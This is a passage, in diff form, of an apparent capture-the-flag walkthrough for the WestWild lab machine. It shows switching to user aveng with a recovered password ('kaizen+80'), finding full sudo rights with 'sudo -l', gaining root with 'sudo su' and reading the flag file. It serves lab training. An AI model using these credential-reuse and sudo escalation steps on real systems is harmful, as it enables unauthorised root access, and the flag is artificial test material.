@@ -154,3 +154,42 @@ wavex@WestWild:~$ cat /usr/share/av/westsidesecret/ififoregt.sh
  echo "password:kaizen+80"
 ```
 
+## 4.Privilege Escalation (aveng)
+
+Now switch user to aveng :
+
+```bash
+wavex@WestWild:~$ su aveng
+Password: 
+aveng@WestWild:/home/wavex$ id
+uid=1000(aveng) gid=1000(aveng) groups=1000(aveng),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(sambashare),114(lpadmin)
+
+aveng@WestWild:/home/wavex$ sudo -l
+[sudo] password for aveng: 
+Matching Defaults entries for aveng on WestWild:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User aveng may run the following commands on WestWild:
+    (ALL : ALL) ALL
+```
+
+we have full access so we can be root
+
+
+## 5.Privilege Escalation (root)
+
+```bash
+veng@WestWild:/home/wavex$ sudo su
+
+root@WestWild:/home/wavex# cd /root
+
+root@WestWild:~# cat FLAG2.txt 
+Flag2{Weeeeeeeeeeeellco0o0om_T0_WestWild}
+
+Great! take a screenshot and Share it with me in twitter @HashimAlshareff
+```
+
+This is how we can get root on this machine :)
+
+
+
